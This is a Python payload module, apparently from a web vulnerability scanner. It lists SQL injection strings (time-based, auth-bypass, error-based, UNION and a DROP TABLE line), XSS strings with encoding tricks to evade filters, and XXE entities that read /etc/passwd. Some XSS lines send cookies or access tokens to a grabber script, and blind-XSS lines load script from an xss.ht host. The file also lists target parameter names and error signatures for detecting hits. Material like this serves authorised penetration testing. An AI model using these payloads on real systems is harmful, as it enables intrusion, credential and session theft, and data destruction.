
__version__ = 1.2



payloads_comments = [
    "--",
    "-- -",
    "#",
    ";"
]

BlindTrue = [
    "AND 1=1",
]

BlindFalse = [
    "AND 1=2"
]

boolean_based_payloads = [
        "' OR '1'='1'",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --"
    ]


time_based_payloads = [
    "sleep(5)#",
    "1 or sleep(5)#",
    "\" or sleep(5)#",
    "' or sleep(5)#",
    "\" or sleep(5)=\"",
    "' or sleep(5)='",
    "1) or sleep(5)#",
    "\") or sleep(5)=\"",
    "\') or sleep(5)='",
    "1)) or sleep(5)#",
    ")) or sleep(5)=\"",
    "')) or sleep(5)='",
    "\")) or sleep(5)=\"",
    "benchmark(10000000,MD5(1))#",
    "1 or benchmark(10000000,MD5(1))#",
    "\" or benchmark(10000000,MD5(1))#",
    "' or benchmark(10000000,MD5(1))#",
    "1) or benchmark(10000000,MD5(1))#",
    "\") or benchmark(10000000,MD5(1))#",
    "\') or benchmark(10000000,MD5(1))#",
    "1)) or benchmark(10000000,MD5(1))#",
    ")) or benchmark(10000000,MD5(1))#",
    "')) or benchmark(10000000,MD5(1))#",
    "pg_sleep(5)--",
    "1 or pg_sleep(5)--",
    "\" or pg_sleep(5)--",
    "' or pg_sleep(5)--",
    "1) or pg_sleep(5)--",
    "\") or pg_sleep(5)--",
    "\') or pg_sleep(5)--",
    "1)) or pg_sleep(5)--",
    ")) or pg_sleep(5)--",
    "')) or pg_sleep(5)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
    "SLEEP(5)#",
    "SLEEP(5)--",
    "SLEEP(5)=\"",
    "SLEEP(5)='",
    "or SLEEP(5)",
    "or SLEEP(5)#",
    "or SLEEP(5)--",
    "or SLEEP(5)=\"",
    "or SLEEP(5)='",
    "waitfor delay '00:00:05'",
    "waitfor delay '00:00:05'--",
    "waitfor delay '00:00:05'#",
    "benchmark(50000000,MD5(1))",
    "benchmark(50000000,MD5(1))--",
    "benchmark(50000000,MD5(1))#",
    "or benchmark(50000000,MD5(1))",
    "or benchmark(50000000,MD5(1))--",
    "or benchmark(50000000,MD5(1))#",
    "pg_SLEEP(5)",
    "pg_SLEEP(5)--",
    "pg_SLEEP(5)#",
    "or pg_SLEEP(5)",
    "or pg_SLEEP(5)--",
    "or pg_SLEEP(5)#",
    "\"\\\"\"",
    "AnD SLEEP(5)",
    "AnD SLEEP(5)--",
    "AnD SLEEP(5)#",
    "&&SLEEP(5)",
    "&&SLEEP(5)--",
    "&&SLEEP(5)#",
    "' AnD SLEEP(5) ANd '1",
    "'&&SLEEP(5)&&'1",
    "ORDER BY SLEEP(5)",
    "ORDER BY SLEEP(5)--",
    "ORDER BY SLEEP(5)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
    "+benchmark(3200,SHA1(1))+",
    "+ SLEEP(10) +",
    "RANDOMBLOB(500000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "RANDOMBLOB(1000000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "WAITFOR DELAY '00:00:01'",
    "sqlite3_sleep(2000)"
]

auth_bypass_payloads = [
    "-",
    " ",
    "&",
    "^",
    "*",
    " or ''-",
    " or '' ",
    " or ''&",
    " or ''^",
    " or ''*",
    "-",
    " ",
    "&",
    "^",
    "*",
    " or ''-",
    " or '' ",
    " or ''&",
    " or ''^",
    " or ''*",
    "or true--",
    " or true--",
    "' or true--",
    "\") or true--",
    "') or true--",
    "' or 'x'='x",
    "') or ('x')=('x",
    "')) or (('x'))=(('x",
    "\" or \"x\"=\"x",
    "\") or (\"x\")=(\"x",
    "\")) or ((\"x\"))=((\"x",
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "admin\" --",
    "admin\" #",
    "admin\"/*",
    "admin\" or \"1\"=\"1",
    "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#",
    "admin\" or \"1\"=\"1\"/*",
    "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1",
    "admin\" or 1=1--",
    "admin\" or 1=1#",
    "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1",
    "admin\") or (\"1\"=\"1\"--",
    "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
]


error_based_payloads = [
    " OR 1=1",
    " OR 1=0",
    " OR x=x",
    " OR x=y",
    " OR 1=1#",
    " OR 1=0#",
    " OR x=x#",
    " OR x=y#",
    " OR 1=1--",
    " OR 1=0--",
    " OR x=x--",
    " OR x=y--",
    " OR 3409=3409 AND ('pytW' LIKE 'pytW",
    " OR 3409=3409 AND ('pytW' LIKE 'pytY",
    " HAVING 1=1",
    " HAVING 1=0",
    " HAVING 1=1#",
    " HAVING 1=0#",
    " HAVING 1=1--",
    " HAVING 1=0--",
    " AND 1=1",
    " AND 1=0",
    " AND 1=1--",
    " AND 1=0--",
    " AND 1=1#",
    " AND 1=0#",
    " AND 1=1 AND '%'='",
    " AND 1=0 AND '%'='",
    " AND 1083=1083 AND (1427=1427",
    " AND 7506=9091 AND (5913=5913",
    " AND 1083=1083 AND ('1427=1427",
    " AND 7506=9091 AND ('5913=5913",
    " AND 7300=7300 AND 'pKlZ'='pKlZ",
    " AND 7300=7300 AND 'pKlZ'='pKlY",
    " AND 7300=7300 AND ('pKlZ'='pKlZ",
    " AND 7300=7300 AND ('pKlZ'='pKlY",
    " AS INJECTX WHERE 1=1 AND 1=1",
    " AS INJECTX WHERE 1=1 AND 1=0",
    " AS INJECTX WHERE 1=1 AND 1=1#",
    " AS INJECTX WHERE 1=1 AND 1=0#",
    " AS INJECTX WHERE 1=1 AND 1=1--",
    " AS INJECTX WHERE 1=1 AND 1=0--",
    " WHERE 1=1 AND 1=1",
    " WHERE 1=1 AND 1=0",
    " WHERE 1=1 AND 1=1#",
    " WHERE 1=1 AND 1=0#",
    " WHERE 1=1 AND 1=1--",
    " WHERE 1=1 AND 1=0--",
    " ORDER BY 1--",
    " ORDER BY 2--",
    " ORDER BY 3--",
    " ORDER BY 4--",
    " ORDER BY 5--",
    " ORDER BY 6--",
    " ORDER BY 7--",
    " ORDER BY 8--",
    " ORDER BY 9--",
    " ORDER BY 10--",
    " ORDER BY 11--",
    " ORDER BY 12--",
    " ORDER BY 13--",
    " ORDER BY 14--",
    " ORDER BY 15--",
    " ORDER BY 16--",
    " ORDER BY 17--",
    " ORDER BY 18--",
    " ORDER BY 19--",
    " ORDER BY 20--",
    " ORDER BY 21--",
    " ORDER BY 22--",
    " ORDER BY 23--",
    " ORDER BY 24--",
    " ORDER BY 25--",
    " ORDER BY 26--",
    " ORDER BY 27--",
    " ORDER BY 28--",
    " ORDER BY 29--",
    " ORDER BY 30--",
    " ORDER BY 31337--",
    " ORDER BY 1#",
    " ORDER BY 2#",
    " ORDER BY 3#",
    " ORDER BY 4#",
    " ORDER BY 5#",
    " ORDER BY 6#",
    " ORDER BY 7#",
    " ORDER BY 8#",
    " ORDER BY 9#",
    " ORDER BY 10#",
    " ORDER BY 11#",
    " ORDER BY 12#",
    " ORDER BY 13#",
    " ORDER BY 14#",
    " ORDER BY 15#",
    " ORDER BY 16#",
    " ORDER BY 17#",
    " ORDER BY 18#",
    " ORDER BY 19#",
    " ORDER BY 20#",
    " ORDER BY 21#",
    " ORDER BY 22#",
    " ORDER BY 23#",
    " ORDER BY 24#",
    " ORDER BY 25#",
    " ORDER BY 26#",
    " ORDER BY 27#",
    " ORDER BY 28#",
    " ORDER BY 29#",
    " ORDER BY 30#",
    " ORDER BY 31337#",
    " ORDER BY 1",
    " ORDER BY 2",
    " ORDER BY 3",
    " ORDER BY 4",
    " ORDER BY 5",
    " ORDER BY 6",
    " ORDER BY 7",
    " ORDER BY 8",
    " ORDER BY 9",
    " ORDER BY 10",
    " ORDER BY 11",
    " ORDER BY 12",
    " ORDER BY 13",
    " ORDER BY 14",
    " ORDER BY 15",
    " ORDER BY 16",
    " ORDER BY 17",
    " ORDER BY 18",
    " ORDER BY 19",
    " ORDER BY 20",
    " ORDER BY 21",
    " ORDER BY 22",
    " ORDER BY 23",
    " ORDER BY 24",
    " ORDER BY 25",
    " ORDER BY 26",
    " ORDER BY 27",
    " ORDER BY 28",
    " ORDER BY 29",
    " ORDER BY 30",
    " ORDER BY 31337",
    " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    " RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
    "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
    "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
    "%' AND 8310=8310 AND '%'='"
    ]

errors_msgs = [
    # ======== SQLite3 ========
    "<b>Warning</b>:  SQLite3",
    "unrecognized token:",
    "Unable to prepare statement:",
    # ======== MySQL =========
    "You have an error in your SQL",
    "MySQL server version for the right syntax",
    "supplied argument is not a valid MySQL result resource",
    # ======== PostgreSQL ========
    "ERROR:  syntax error",
    # ======== normal errors ========
    'SQL syntax error',
    'MySQL error',
    'SQLServer error'
]

payloads = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "\" OR 1 = 1 -- -",
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%00",
    "/*…*/",
    "+",
    "||",
    "%",
    "@variable",
    "@@variable",
    "# Numeric",
    "AND 1",
    "AND 0",
    "AND true",
    "AND false",
    "1-false",
    "1-true",
    "1*56",
    "-2",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+",
    "1' ORDER BY 1,2,3--+",
    "1' GROUP BY 1,2,--+",
    "1' GROUP BY 1,2,3--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3--+",
    "' UNION SELECT sum(columnname ) from tablename --",
    "-1 UNION SELECT 1 INTO @,@",
    "-1 UNION SELECT 1 INTO @,@,@",
    "1 AND (SELECT * FROM Users) = 1",
    "' AND MID(VERSION(),1,1) = '5';",
    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
    "Finding the table name",
    "Time-Based: ,(select * from (select(sleep(10)))a)",
    "%2c(select%20*%20from%20(select(sleep(10)))a)",
    "';WAITFOR DELAY '0:0:30'--",
    "Comments: # Hash comment /* C-style comment -- - SQL comment ;%00 Nullbyte ` Backtick"
]

params = [
    "id",
    "username",
    "password",
    "email",
    "phone",
    "address",
    "city",
    "state",
    "zip",
    "country",
    "firstname",
    "lastname",
    "name",
    "title",
    "description",
    "category",
    "tags",
    "search",
    "sort",
    "order",
    "limit",
    "offset",
    "page",
    "lang",
    "currency",
    "price",
    "quantity",
    "action",
    "submit",
    "token",
    "user_id",
    "user_name",
    "user_email",
    "user_phone",
    "user_address",
    "user_city",
    "user_state",
    "user_zip",
    "user_country",
    "user_firstname",
    "user_lastname",
    "product_id",
    "product_name",
    "product_description",
    "product_category",
    "product_tags",
    "product_price",
    "product_quantity",
    "order_id",
    "order_user_id",
    "order_product_id",
    "order_quantity",
    "order_price",
    "order_status",
    "review_id",
    "review_user_id",
    "review_product_id",
    "review_rating",
    "review_comment",
    "review_status",
    "blog_id",
    "blog_title",
    "blog_content",
    "blog_category",
    "blog_tags",
    "blog_status",
    "comment_id",
    "comment_user_id",
    "comment_blog_id",
    "comment_content",
    "comment_status",
    "setting_id",
    "setting_site_name",
    "setting_site_description",
    "setting_site_url",
    "setting_site_logo",
    "setting_site_favicon",
    "setting_site_theme"
    ]


union_select_payloads = [
    "UNION ALL SELECT 1",
    "UNION ALL SELECT 1,2",
    "UNION ALL SELECT 1,2,3",
  
    "UNION ALL SELECT 1,2,3,4",
    "UNION ALL SELECT 1,2,3,4,5",
    "UNION ALL SELECT 1,2,3,4,5,6",
    "UNION ALL SELECT 1,2,3,4,5,6,7",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
    "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25"
]

xss_waf_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;",
    "'\"><script>alert('XSS')</script>",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "&#x3C;img src=x onerror=alert('XSS')&#x3E;",
    "&#x3C;svg onload=alert('XSS')&#x3E;",
    "&#x3C;ScRiPt>alert('XSS')&#x3C;/ScRiPt>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<input type=text value='XSS' onfocus=alert('XSS')>",
    "<a href=# data-attribute='javascript:alert('XSS')'>Click me</a>",
    "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
    "<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><pwn>&xxe;</pwn>"
]


reflected_xss_payloads = [
    "<script>alert('Reflected XSS 1');</script>",
    "<script>alert('Reflected XSS 2');</script>",
    "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
    "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
    "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>",
    "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>",
    '<script>alert(document.domain.concat("\n").concat(window.origin))</script>',
    '<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>',
    "<script>alert('XSS')</script>",
    "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
    "\"><script>alert('XSS')</script>",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>\\u0061lert('22')</script>",
    "<script>eval('\\x61lert(\\'33\\')')</script>",
    "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
    "<img src=x onerror=alert('XSS');>",
    "<img src=x onerror=alert('XSS')//>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "\"><img src=x onerror=alert('XSS');>",
    "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
    "<><img src=1 onerror=alert(1)>",
    "<svg\x0conload=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)//",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    "<svg id=alert(1) onload=eval(id)>",
    "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
    "\"><svg/onload=alert(/XSS/)>",
    "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
    "<svg><script>alert('33')",
    "<svg><script>alert&lpar;'33'&rpar;",
    "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
    "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
    "<div onpointerup=\"alert(45)\">MOVE HERE</div>",
]

dom_based_xss_payloads = [
    "';alert('DOM-based XSS 1');//",
    "';alert('DOM-based XSS 2');//",
    "#\"><img src=/ onerror=alert(2)>",
    "-(confirm)(document.domain)//",
    "; alert(1);//",
    "javascript:prompt(1)",
    f"%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
    "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
    "\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)",
    "\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)",
    f"java%0ascript:alert(1)",
    f"java%09script:alert(1)",
    f"java%0dscript:alert(1)",
    "\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)",
    "javascript://%0Aalert(1)",
    "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
    "data:text/html,<script>alert(0)</script>",
    "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",
    "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
    "vbscript:msgbox(\"XSS\")",
]

blind_xss_payloads = [
    "\"><script src=//<custom.subdomain>.xss.ht></script>",
    "<script>$.getScript(\"//<custom.subdomain>.xss.ht\")</script>",
    "<script>document.location='<custom.subdomain>/XSS/grabber.php?c='+document.domain</script>"
]

headers = { #header to scan host header injection
    'X-Forwarded-Host': 'www.ping.com',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
}
